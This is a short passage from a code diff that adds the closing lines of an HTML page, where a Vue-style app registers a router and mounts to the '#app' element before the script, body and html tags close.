+      app.use(router);
+      app.mount('#app');
+    })();
+  </script>
+</body>
+</html>
